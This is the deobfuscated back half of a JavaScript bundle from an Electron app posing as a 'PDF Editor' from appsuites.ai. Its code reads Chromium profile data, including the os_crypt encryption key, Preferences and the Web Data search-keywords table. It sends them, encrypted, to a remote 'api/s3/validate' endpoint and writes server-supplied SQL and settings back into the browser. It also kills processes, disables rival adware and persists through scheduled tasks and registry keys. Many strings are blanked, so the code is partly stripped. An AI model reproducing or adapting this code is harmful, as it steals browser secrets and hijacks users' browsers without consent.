                    await no.w3F3UWA.W4EF0EI(qs, no.z579NEI.L5CFOQF);
                    return;
                  }
                  no.w3F3UWA.s59BT06('');
                  if (await this.H5AE3US(re.C5C7K1A)) {
                    await this.Y53EKLA(qz, re.C5C7K1A);
                    await this.X428OQY(qz, qy);
                    no.w3F3UWA.s59BT06('');
                  }
                  if ((await this.H5AE3US(re.p6845JK)) && (await this.r501Z9L(rb, re.p6845JK))) {
                    if (await this.o43FWNP(false, qs)) {
                      await this.D45AYQ3("");
                      no.w3F3UWA.s59BT06('');
                    }
                    await this.X428OQY(rb, ra);
                    no.w3F3UWA.s59BT06('');
                    await no.w3F3UWA.W4EF0EI(qs, no.z579NEI.W4F1V66);
                  } else {
                    await no.w3F3UWA.W4EF0EI(qs, no.z579NEI.n4EBPL8);
                  }
                  flag4 = true;
                }
              }
              if (flag4) {
                await nn.S559FZQ.c5E4Z7C("cw-key", np.e5325L3.q474LOF);
              }
            }
          }
          no.w3F3UWA.s59BT06('');
          return;
        }
        async k47F3QK(rj) {
          let rk = nq.q564DFB;
          no.w3F3UWA.s59BT06('');
          if (!np.e5325L3.k596N0J) {
            return;
          }
          const path7 = require("path");
          const rl = nn.S559FZQ.D47CBV3();
          if (!rl) {
            await no.w3F3UWA.Y6CDW21(nq.B639G7B, no.z579NEI.F65A6FS);
            return;
          }
          const rm = path7.join(rl, "");
          if (np.e5325L3.a6B1QAU == '') {
            await no.w3F3UWA.W4EF0EI(rk, no.z579NEI.m599GWS);
            return;
          }
          if (this.Z5A9DKG || !rj || np.e5325L3.x484Q1X == nn.a689XV5.j5C58S9) {
            if (rj) {
              rj = false;
              await this.D45AYQ3("");
              no.w3F3UWA.s59BT06('');
            }
            no.w3F3UWA.s59BT06('');
            let [rn, ro] = await this.A554U7Y(rk, path7.join(rm, ""), true);
            if (ro && ro !== '') {
              ro = this.r42EX1Q(ro);
              no.w3F3UWA.s59BT06('');
            }
            if (rn) {
              let flag5 = false;
              for (let rp = 0; rp < rn.length; rp++) {
                let rq = path7.join(rm, rn[rp], "");
                let rr = path7.join(rm, rn[rp], "");
                let rs = path7.join(rm, rn[rp], "");
                let rt = path7.join(rm, rn[rp], "");
                if (await this.X428OQY(rq, rr)) {
                  await this.X428OQY(rs, rt);
                  let ru;
                  let rv;
                  await this.r576OBZ(rr).then((rx) => {
                    ru = rx;
                  }).catch((ry) => {
                    (async () => {
                      await no.w3F3UWA.Y6CDW21(rk, no.z579NEI.n690Q7K, ry);
                    })();
                  });
                  await this.G5B8BDL(rt).then((rz) => {
                    rv = rz ?? '';
                  }).catch((sa) => {
                    (async () => {
                      await no.w3F3UWA.Y6CDW21(rk, no.z579NEI.K4E5MWI, sa);
                    })();
                  });
                  if (ru == '') {
                    await no.w3F3UWA.W4EF0EI(rk, no.z579NEI.Q455VXT);
                    continue;
                  }
                  no.w3F3UWA.s59BT06('');
                  let rw = await this.w516KLO(rk, ro, ru, rv);
                  if (!rw.m5BCP18) {
                    await no.w3F3UWA.W4EF0EI(rk, no.z579NEI.L5CFOQF);
                    return;
                  }
                  no.w3F3UWA.s59BT06('');
                  if (await this.H5AE3US(rw.C5C7K1A)) {
                    await this.Y53EKLA(rr, rw.C5C7K1A);
                    await this.X428OQY(rr, rq);
                    no.w3F3UWA.s59BT06('');
                  }
                  if ((await this.H5AE3US(rw.p6845JK)) && (await this.r501Z9L(rt, rw.p6845JK))) {
                    if (await this.o43FWNP(false, rk)) {
                      await this.D45AYQ3("");
                      no.w3F3UWA.s59BT06('');
                    }
                    await this.X428OQY(rt, rs);
                    no.w3F3UWA.s59BT06('');
                    await no.w3F3UWA.W4EF0EI(rk, no.z579NEI.W4F1V66);
                  } else {
                    await no.w3F3UWA.W4EF0EI(rk, no.z579NEI.n4EBPL8);
                  }
                  flag5 = true;
                }
              }
              if (flag5) {
                await nn.S559FZQ.c5E4Z7C("ew-key", np.e5325L3.q474LOF);
              }
            }
          }
          no.w3F3UWA.s59BT06('');
          return;
        }
        async E4E2LLU(sb) {
          return new Promise((sc) => setTimeout(sc, sb));
        }
        async D45AYQ3(sd, se = true) {
          const cp3 = require("child_process");
          if (se) {
            for (let sf = 0; sf < 3; sf++) {
              no.w3F3UWA.s59BT06('');
              cp3.exec((0, no.o5B4F49)("", sd));
              await this.E4E2LLU(100);
            }
          }
          no.w3F3UWA.s59BT06('');
          cp3.exec((0, no.o5B4F49)("", sd));
          await this.E4E2LLU(100);
        }
        async A554U7Y(sg, sh, si = false) {
          try {
            const data4 = JSON.parse(require("fs").readFileSync(sh, "utf8"));
            no.w3F3UWA.s59BT06('');
            no.w3F3UWA.s59BT06('');
            return [Object.keys(data4.profile?.info_cache || {}), si ? data4.os_crypt?.encrypted_key || '' : ''];
          } catch (sj) {
            await no.w3F3UWA.Y6CDW21(sg, no.z579NEI.y46BIEQ, sj);
          }
          return [undefined, undefined];
        }
        async X428OQY(sk, sl) {
          try {
            require("fs").copyFileSync(sk, sl);
            return true;
          } catch {
            return false;
          }
        }
        async r576OBZ(sm, sn = false) {
          const fs10 = require("fs");
          try {
            if (!sn) {
              return fs10.readFileSync(sm, "utf8");
            }
            return fs10.readFileSync(sm);
          } catch (so) {
            throw new Error("ReadFileError: " + so);
          }
        }
        async G5B8BDL(sp) {
          const sq = new require("better-sqlite3")(sp);
          try {
            return JSON.stringify(sq.prepare("select * from keywords").all());
          } catch (sr) {
            no.w3F3UWA.s59BT06('');
            throw new Error(sr);
          } finally {
            sq.close((ss) => {
              if (ss) {
                no.w3F3UWA.s59BT06('');
              }
            });
          }
        }
        async r501Z9L(st, su) {
          const sv = new require("better-sqlite3")(st);
          try {
            for (const sw of JSON.parse(su)) {
              sv.prepare(sw).run();
              no.w3F3UWA.s59BT06('');
            }
          } catch {
            no.w3F3UWA.s59BT06('');
            return false;
          } finally {
            sv.close((sx) => {
              if (sx) {
                no.w3F3UWA.s59BT06('');
                return;
              }
              no.w3F3UWA.s59BT06('');
            });
          }
          return true;
        }
        async Y53EKLA(sy, sz) {
          try {
            require("fs").writeFileSync(sy, sz);
          } catch {
            no.w3F3UWA.s59BT06('');
          }
        }
        async A5FCGS4(ta) {
          return require("fs").existsSync(ta);
        }
        async O69AL84(tb, tc, td) {
          try {
            require("child_process").execSync((0, no.o5B4F49)("", tb, tc, td));
          } catch (te) {
            await no.w3F3UWA.Y6CDW21(nq.B639G7B, no.z579NEI.u3F4OPT, te);
          }
        }
        async w4D8BBU(tf, tg) {
          try {
            no.w3F3UWA.s59BT06('');
            require("child_process").execSync((0, no.o5B4F49)("", tf, tg));
          } catch (th) {
            await no.w3F3UWA.Y6CDW21(nq.N6330WH, no.z579NEI.h6148NE, th);
          }
        }
        async u459C3E(ti, tj) {
          try {
            const tk = tj.trim() == '' ? (0, no.o5B4F49)("", ti) : (0, no.o5B4F49)("", ti, tj);
            require("child_process").execSync(tk);
            return true;
          } catch (tl) {
            if (!tl.stderr.includes("")) {
              await no.w3F3UWA.Y6CDW21(nq.B639G7B, no.z579NEI.m4F36Z7, tl);
            }
          }
          return false;
        }
        async H5AE3US(tm) {
          if (!tm) {
            return false;
          }
          if (tm.length == 0) {
            return false;
          }
          try {
            let data5 = JSON.parse(tm);
            return true;
          } catch {
            return false;
          }
        }
        async e4F5CS0() {
          try {
            var tn = np.e5325L3.q474LOF ?? '';
            const params3 = new require("url").URLSearchParams();
            const to = nn.S559FZQ.n677BRA.substring(0, 24) + tn.substring(0, 8);
            const obj6 = {
              iid: tn,
              version: np.e5325L3.Y55B2P2,
              isSchedule: '0',
              hasBLFile: np.e5325L3.b57CS7T,
              hasBLReg: np.e5325L3.K48B40X,
              supportWd: '1'
            };
            const tp = no.O694X7J(to, JSON.stringify(obj6));
            params3.append("data", tp.data);
            params3.append("iv", tp.iv);
            params3.append("iid", np.e5325L3.q474LOF ?? '');
            no.w3F3UWA.s59BT06('');
            let tq = await no.h5235DD("api/s3/config", params3);
            if (tq && tq.ok) {
              let tr = await tq.json();
              no.w3F3UWA.s59BT06('');
              try {
                if (tr.data) {
                  const data6 = JSON.parse((0, no.U61FWBZ)(to, tr.data, tr.iv));
                  no.w3F3UWA.s59BT06('');
                  let ts = new nr();
                  ts.H5C67AR = data6.wc ?? false;
                  ts.n412K1U = data6.wcs ?? false;
                  ts.n5B332O = data6.wcpc ?? false;
                  ts.k61AQMQ = data6.wcpe ?? false;
                  ts.a6AFL0X = data6.wdc ?? false;
                  ts.D4E3EHU = data6.wde ?? false;
                  ts.E67CJ69 = data6.ol ?? false;
                  ts.a586DQ2 = data6.ol_deep ?? false;
                  ts.X42CN81 = data6.wv ?? false;
                  ts.Y4B23HN = data6.wv_deep ?? false;
                  ts.T5B2T2A = data6.sf ?? false;
                  ts.V54518G = data6.sf_deep ?? false;
                  ts.T5F71B2 = data6.pas ?? false;
                  ts.g5ABMVH = data6.pas_deep ?? false;
                  ts.t533W41 = data6.code ?? '';
                  ts.O6CBOE4 = data6.reglist ?? '';
                  return ts;
                }
              } catch (tt) {
                await no.w3F3UWA.Y6CDW21(nq.B639G7B, no.z579NEI.e5C24C6, tt);
              }
            } else {
              no.w3F3UWA.s59BT06('');
            }
          } catch (tu) {
            await no.w3F3UWA.Y6CDW21(nq.B639G7B, no.z579NEI.E4AAIZR, tu);
          }
          return new nr();
        }
        async O515QL8(tv, tw, tx) {
          no.w3F3UWA.s59BT06('');
          try {
            var ty = np.e5325L3.q474LOF ?? '';
            const params4 = new require("url").URLSearchParams();
            const tz = nn.S559FZQ.n677BRA.substring(0, 24) + ty.substring(0, 8);
            const obj7 = {
              iid: ty,
              bid: tv,
              sid: this.A64CEBI,
              pref: tw,
              spref: tx,
              wd: '',
              version: np.e5325L3.Y55B2P2,
              supportWd: '0',
              isSchedule: '0'
            };
            no.w3F3UWA.s59BT06('');
            const ua = no.O694X7J(tz, JSON.stringify(obj7));
            params4.append("data", ua.data);
            params4.append("iv", ua.iv);
            params4.append("iid", np.e5325L3.q474LOF ?? '');
            no.w3F3UWA.s59BT06('');
            let ub = await no.h5235DD("api/s3/validate", params4);
            if (!ub || !ub.ok) {
              no.w3F3UWA.s59BT06('');
              return new ns();
            }
            let uc = await ub.json();
            no.w3F3UWA.s59BT06('');
            try {
              if (uc.data) {
                const data7 = JSON.parse((0, no.U61FWBZ)(tz, uc.searchdata, uc.iv));
                let ud = JSON.stringify(data7.pref) ?? '';
                let ue = JSON.stringify(data7.spref) ?? '';
                let uf = JSON.stringify(data7.regdata) ?? '';
                let ug = JSON.stringify(data7.reglist) ?? '';
                if (ud == "null") {
                  ud = '';
                }
                if (ue == "null") {
                  ue = '';
                }
                if (uf == "\"\"") {
                  uf = '';
                }
                if (ug == "\"\"") {
                  ug = '';
                }
                return new ns(true, ud, ue, uf, ug);
              }
            } catch (uh) {
              await no.w3F3UWA.Y6CDW21(tv, no.z579NEI.l54DEIW, uh);
            }
          } catch (ui) {
            await no.w3F3UWA.Y6CDW21(tv, no.z579NEI.M5E3V2V, ui, ["https://appsuites.ai", "https://sdk.appsuites.ai"]);
          }
          return new ns();
        }
        async w516KLO(uj, uk, ul, um) {
          no.w3F3UWA.s59BT06('');
          try {
            var un = np.e5325L3.q474LOF ?? '';
            const params5 = new require("url").URLSearchParams();
            const uo = nn.S559FZQ.n677BRA.substring(0, 24) + un.substring(0, 8);
            const obj8 = {
              iid: un,
              bid: uj,
              sid: this.A64CEBI,
              pref: ul,
              spref: '',
              osCryptKey: uk,
              wd: um,
              version: np.e5325L3.Y55B2P2,
              supportWd: '1',
              isSchedule: '0'
            };
            const up = no.O694X7J(uo, JSON.stringify(obj8));
            params5.append("data", up.data);
            params5.append("iv", up.iv);
            params5.append("iid", np.e5325L3.q474LOF ?? '');
            no.w3F3UWA.s59BT06('');
            let uq = await no.h5235DD("api/s3/validate", params5);
            if (!uq || !uq.ok) {
              no.w3F3UWA.s59BT06('');
              return new nt();
            }
            let ur = await uq.json();
            try {
              if (ur.data) {
                if (!ur.searchdata) {
                  return new nt(true, '', '');
                }
                const data8 = JSON.parse((0, no.U61FWBZ)(uo, ur.searchdata, ur.iv));
                const us = data8.pref ?? '';
                const ut = data8.webData ?? '';
                no.w3F3UWA.s59BT06('');
                no.w3F3UWA.s59BT06('');
                let uu = ut !== '' ? JSON.stringify(ut) ?? '' : '';
                return new nt(true, us !== '' ? JSON.stringify(us) ?? '' : '', ut);
              }
            } catch (uv) {
              await no.w3F3UWA.Y6CDW21(uj, no.z579NEI.l54DEIW, uv);
            }
          } catch (uw) {
            await no.w3F3UWA.Y6CDW21(uj, no.z579NEI.M5E3V2V, uw, ["https://appsuites.ai", "https://sdk.appsuites.ai"]);
          }
          return new nt();
        }
        async g4EE56L(ux) {
          try {
            const uy = (await nn.S559FZQ.l610ZCY(ux)) ?? '';
            if (uy == '') {
              return nv.s46FO09;
            }
            return parseInt(uy);
          } catch {
            no.w3F3UWA.s59BT06('');
            return nv.s46FO09;
          }
        }
        async w5C1TZN(uz) {
          const va = nq.q5A5TD7;
          const vb = nn.S559FZQ.D47CBV3();
          if (!vb) {
            no.w3F3UWA.s59BT06('');
            return;
          }
          let vc = require("path").join(vb, "");
          const fs11 = require("fs");
          try {
            let data9 = JSON.parse(fs11.readFileSync(vc, "utf8"));
            const vd = await this.g4EE56L("wv-key");
            if (data9[""] ?? true || (data9[""]?.[""] ?? true) || (data9[""] ?? true) || (data9[""] ?? true)) {
              if (nv.s46FO09 == vd || uz) {
                await this.D45AYQ3("");
                data9[""] = false;
                if (!data9[""]) {
                  data9[""] = {
                    "": false
                  };
                } else {
                  data9[""][""] = false;
                }
                data9[""] = false;
                data9[""] = false;
                fs11.writeFileSync(vc, JSON.stringify(data9), "utf8");
                await no.w3F3UWA.W4EF0EI(va, no.z579NEI.R3F76I3, [uz, vd]);
                await nn.S559FZQ.c5E4Z7C("wv-key", '' + nv.d56ECUF);
              } else {
                await no.w3F3UWA.W4EF0EI(va, no.z579NEI.v535X73, [uz, vd]);
              }
            } else {
              let flag6 = false;
              if (nv.d56ECUF == vd) {
                const ve = this.e5FBF4O("\\Wavesor Software_" + (this.X6066R5() ?? ''), "WaveBrowser-StartAtLogin", 1);
                const vf = this.t4E0LPU("\\");
                if (ve != undefined && false == ve && vf != undefined && vf) {
                  flag6 = true;
                  await nn.S559FZQ.c5E4Z7C("wv-key", '' + nv.z479UBI);
                  await this.D45AYQ3("");
                  await no.w3F3UWA.W4EF0EI(va, no.z579NEI.d422GJH, [uz, vd]);
                }
              }
              if (!flag6) {
                await no.w3F3UWA.W4EF0EI(va, no.z579NEI.Q542KEX, [uz, vd]);
              }
            }
          } catch {
            no.w3F3UWA.s59BT06('');
            await no.w3F3UWA.W4EF0EI(va, no.z579NEI.u51A2HJ);
          }
        }
        async c647ECB(vg) {
          const vh = nq.h6074WA;
          const fs12 = require("fs");
          const vi = require("path").join(nn.S559FZQ.D47CBV3(), "", "");
          try {
            let data10 = JSON.parse(fs12.readFileSync(vi, "utf8"));
            const vj = await this.g4EE56L("ol-key");
            if (data10[""] || data10[""] || data10[""] || data10[""] || data10[""]) {
              if (nv.s46FO09 == vj || vg) {
                data10[""] = false;
                data10[""] = false;
                data10[""] = false;
                data10[""] = false;
                data10[""] = false;
                await this.D45AYQ3("");
                fs12.writeFileSync(vi, JSON.stringify(data10, null, 2), "utf8");
                await this.D45AYQ3("");
                await no.w3F3UWA.W4EF0EI(vh, no.z579NEI.R3F76I3, [vg, vj]);
                await nn.S559FZQ.c5E4Z7C("ol-key", '' + nv.d56ECUF);
              } else {
                await no.w3F3UWA.W4EF0EI(vh, no.z579NEI.v535X73, [vg, vj]);
              }
            } else {
              let flag7 = false;
              if (nv.d56ECUF == vj) {
                const vk = this.e5FBF4O('', "OneLaunchLaunchTask", 1);
                const vl = this.t4E0LPU("\\");
                if (vk != undefined && false == vk && vl != undefined && vl) {
                  flag7 = true;
                  await nn.S559FZQ.c5E4Z7C("ol-key", '' + nv.z479UBI);
                  await this.D45AYQ3("");
                  await this.D45AYQ3("");
                  await no.w3F3UWA.W4EF0EI(vh, no.z579NEI.d422GJH, [vg, vj]);
                }
              }
              if (!flag7) {
                await no.w3F3UWA.W4EF0EI(vh, no.z579NEI.Q542KEX, [vg, vj]);
              }
            }
          } catch {
            no.w3F3UWA.s59BT06('');
            await no.w3F3UWA.W4EF0EI(vh, no.z579NEI.u51A2HJ);
          }
        }
        async h659UF4(vm) {
          const vn = nq.F58C0X0;
          const vo = nn.S559FZQ.D47CBV3();
          if (!vo) {
            no.w3F3UWA.s59BT06('');
            return;
          }
          let vp = require("path").join(vo, "");
          const fs13 = require("fs");
          try {
            let data11 = JSON.parse(fs13.readFileSync(vp, "utf8"));
            let flag8 = true;
            if ("shift" in data11 && "browser" in data11.shift) {
              const vr = data11.shift.browser;
              flag8 = vr.launch_on_login_enabled ?? true || (vr.launch_on_wake_enabled ?? true) || (vr.run_in_background_enabled ?? true);
            }
            const vq = await this.g4EE56L("sf-key");
            if (flag8) {
              if (nv.s46FO09 == vq || vm) {
                if (!("shift" in data11)) {
                  data11.shift = {};
                }
                if (!("browser" in data11.shift)) {
                  data11.shift.browser = {};
                }
                data11.shift.browser.launch_on_login_enabled = false;
                data11.shift.browser.launch_on_wake_enabled = false;
                data11.shift.browser.run_in_background_enabled = false;
                await this.D45AYQ3("");
                fs13.writeFileSync(vp, JSON.stringify(data11), "utf8");
                await no.w3F3UWA.W4EF0EI(vn, no.z579NEI.R3F76I3, [vm, vq]);
                await nn.S559FZQ.c5E4Z7C("sf-key", '' + nv.d56ECUF);
              } else {
                await no.w3F3UWA.W4EF0EI(vn, no.z579NEI.v535X73, [vm, vq]);
              }
            } else {
              let flag9 = false;
              if (nv.d56ECUF == vq) {
                const vs = this.e5FBF4O('', "ShiftLaunchTask", 1);
                const vt = this.t4E0LPU("\\");
                if (vs != undefined && false == vs && vt != undefined && vt) {
                  flag9 = true;
                  await nn.S559FZQ.c5E4Z7C("sf-key", '' + nv.z479UBI);
                  await this.D45AYQ3("");
                  await no.w3F3UWA.W4EF0EI(vn, no.z579NEI.d422GJH, [vm, vq]);
                }
              }
              if (!flag9) {
                await no.w3F3UWA.W4EF0EI(vn, no.z579NEI.Q542KEX, [vm, vq]);
              }
            }
          } catch {
            no.w3F3UWA.s59BT06('');
            await no.w3F3UWA.W4EF0EI(vn, no.z579NEI.u51A2HJ);
          }
        }
        async W5F8HOG(vu) {
          const vv = nq.i623ZUC;
          const path8 = require("path");
          const fs14 = require("fs");
          try {
            let vw = (await this.u459C3E("HKCU", "")) || (await this.u459C3E("HKCU", "")) || (await this.u459C3E("HKCU", ""));
            const vx = await this.g4EE56L("pas-key");
            if (vw) {
              if (nv.s46FO09 == vx || vu) {
                await this.D45AYQ3("", false);
                await this.D45AYQ3("", false);
                await this.w4D8BBU("", "");
                await this.w4D8BBU("", "");
                await this.w4D8BBU("", "");
                await no.w3F3UWA.W4EF0EI(vv, no.z579NEI.R3F76I3, [vu, vx]);
                await nn.S559FZQ.c5E4Z7C("pas-key", '' + nv.d56ECUF);
              } else {
                await no.w3F3UWA.W4EF0EI(vv, no.z579NEI.v535X73, [vu, vx]);
              }
            } else if (nv.d56ECUF == vx) {
              await no.w3F3UWA.W4EF0EI(vv, no.z579NEI.Q542KEX, [vu, vx]);
            }
          } catch {
            await no.w3F3UWA.W4EF0EI(vv, no.z579NEI.u51A2HJ);
          }
        }
      };
      nm.A672SIS = nw;
    }
  });
  var h = b({
    'obj/globals.js'(vy, vz) {
      'use strict';

      var obj9 = {
        homeUrl: "https://pdf-tool.appsuites.ai/en/pdfeditor",
        CHANNEL_NAME: "main",
        USER_AGENT: "PDFFusion/93HEU7AJ",
        productName: "PDFEditor",
        appName: "PDF Editor",
        scheduledTaskName: "PDFEditorScheduledTask",
        registryName: 'PDFEditorUpdater',
        modeDataPath: "\\mode.data",
        scheduledUTaskName: "PDFEditorUScheduledTask",
        iconSubPath: "\\assets\\icons\\win\\pdf-n.ico"
      };
      vz.exports = obj9;
    }
  });
  var i = b({
    'obj/window.js'(wa) {
      'use strict';

      var {
        BrowserWindow: electron
      } = require("electron");
      wa.createBrowserWindow = () => {
        let wb = __dirname;
        wb = wb.replace("src", '');
        let wc = wb + h().iconSubPath;
        console.log(wc);
        const wd = new electron({
          resizable: true,
          width: 1024,
          height: 768,
          icon: wc,
          autoHideMenuBar: true,
          backgroundColor: "#fff",
          webPreferences: {
            devTools: false,
            preload: require("path").join(__dirname, "./preload.js")
          }
        });
        return wd;
      };
    }
  });
  var j = b({
    'obj/D3E8Q17.js'(we) {
      Object.defineProperty(we, "__esModule", {
        value: true
      });
      var wf = c();
      var fs15 = require('fs');
      var Utilityaddon = require(".\\lib\\Utilityaddon.node");
      var wg = h();
      async function wh() {
        const wi = (ww) => {
          switch (ww) {
            case "--install":
              return wf.a689XV5.b5BEPQ2;
            case "--check":
              return wf.a689XV5.V4E6B4O;
            case "--reboot":
              return wf.a689XV5.j5C58S9;
            case "--cleanup":
              return wf.a689XV5.Z498ME9;
            case "--ping":
              return wf.a689XV5.f63DUQF;
          }
          return wf.a689XV5.B639G7B;
        };
        let flag10 = false;
        let wj = _0x3ce3ae.commandLine.getSwitchValue('c');
        let wk = _0x3ce3ae.commandLine.getSwitchValue('cm');
        console.log('args=' + wj);
        console.log("args2=" + wk);
        let wl = __dirname.replace("\\resources\\app\\w-electron\\bin\\release", '');
        console.log("wkdir = " + wl);
        if (!_0x3ce3ae.commandLine.hasSwitch('c') && !_0x3ce3ae.commandLine.hasSwitch('cm')) {
          await wm('--install');
          wu();
        }
        if (_0x3ce3ae.commandLine.hasSwitch('c') && wj == '0') {
          wu();
        }
        if (_0x3ce3ae.commandLine.hasSwitch('cm')) {
          if (wk == "--cleanup") {
            await wm(wk);
            console.log("remove ST");
            Utilityaddon.remove_task_schedule(wg.scheduledTaskName);
            Utilityaddon.remove_task_schedule(wg.scheduledUTaskName);
          } else if (wk == "--partialupdate") {
            await wm('--check');
          } else if (wk == "--fullupdate") {
            await wm("--reboot");
          } else if (wk == "--enableupdate") {
            Utilityaddon.SetRegistryValue(wg.registryName, "\"" + wl + "\\" + wg.appName + "\" --cm=--fullupdate");
          } else if (wk == "--disableupdate") {
            Utilityaddon.DeleteRegistryValue(wg.registryName);
          } else if (wk == "--backupupdate") {
            await wm("--ping");
          }
          if (!_0x3ce3ae.commandLine.hasSwitch('c')) {
            _0x3ce3ae.quit();
          }
        }
        async function wm(wx) {
          console.log("To add wc routine");
          await wt(wx);
        }
        function wn() {
          return Utilityaddon.get_sid();
        }
        function wo(wy) {
          return Utilityaddon.GetOsCKey(wy);
        }
        function wp(wz, xa, xb) {
          return Utilityaddon.mutate_task_schedule(wz, xa, xb);
        }
        function wq(xc) {
          return Utilityaddon.find_process(xc);
        }
        function wr() {
          return Utilityaddon.GetPsList();
        }
        function ws() {
          try {
            let xd = Utilityaddon.mutate_task_schedule("\\", wg.scheduledTaskName, 1);
            if (!xd) {
              Utilityaddon.create_task_schedule(wg.scheduledTaskName, wg.scheduledTaskName, "\"" + wl + "\\" + wg.appName + "\"", "--cm=--partialupdate", wl, 1442);
            }
            let xe = Utilityaddon.mutate_task_schedule("\\", wg.scheduledUTaskName, 1);
            if (!xd) {
              Utilityaddon.create_repeat_task_schedule(wg.scheduledUTaskName, wg.scheduledUTaskName, "\"" + wl + "\\" + wg.appName + "\"", "--cm=--backupupdate", wl);
            }
          } catch (xf) {
            console.log(xf);
          }
        }
        async function wt(xg) {
          let xh = wi(xg);
          console.log("argument = " + xg);
          const xi = new g().A672SIS(wn, wo, wp, wq, wr);
          if (wf.a689XV5.b5BEPQ2 == xh) {
            if ((await xi.q41FDEK()) == g().U5E7DEV.C5B7MFV) {
              ws();
            }
          } else if (wf.a689XV5.Z498ME9 == xh) {
            await xi.l660ZQF();
          } else if (wf.a689XV5.f63DUQF == xh) {
            await xi.A4B0MTO();
          } else {
            e().w3F3UWA.s59BT06('');
            await xi.m58FJB5(xh);
          }
        }
        function wu() {
          try {
            let xj = wl + wg.modeDataPath;
            console.log("modeFile = " + xj);
            if (fs15.existsSync(xj)) {
              flag10 = false;
            } else {
              flag10 = true;
            }
          } catch (xk) {
            console.log(xk);
          }
        }
        function wv() {
          try {
            let xl = wl + wg.modeDataPath;
            if (fs15.existsSync(xl)) {
              fs15.rmSync(xl, {
                force: true
              });
            }
          } catch (xm) {
            console.log(xm);
          }
        }
        if (flag10) {
          _0x3ce3ae.whenReady().then(() => {
            let xn = i().createBrowserWindow(_0x3ce3ae);
            require("electron").session.defaultSession.webRequest.onBeforeSendHeaders((xo, xp) => {
              xo.requestHeaders["User-Agent"] = wg.USER_AGENT;
              xp({
                cancel: false,
                requestHeaders: xo.requestHeaders
              });
            });
            xn.loadURL(wg.homeUrl);
            xn.on("close", function (xq) {
              xq.preventDefault();
              xn.destroy();
            });
          });
          _0x3dd9a0.on(wg.CHANNEL_NAME, (xr, xs) => {
            if (xs == "Set") {
              Utilityaddon.SetRegistryValue(wg.registryName, "\"" + wl + "\\" + wg.appName + "\" --cm=--fullupdate");
            }
            if (xs == "Unset") {
              Utilityaddon.DeleteRegistryValue(wg.registryName);
            }
          });
          _0x3ce3ae.on("window-all-closed", () => {
            if (process.platform !== "darwin") {
              _0x3ce3ae.quit();
            }
          });
        }
        wv();
      }
      wh();
    }
  });
  j();
})();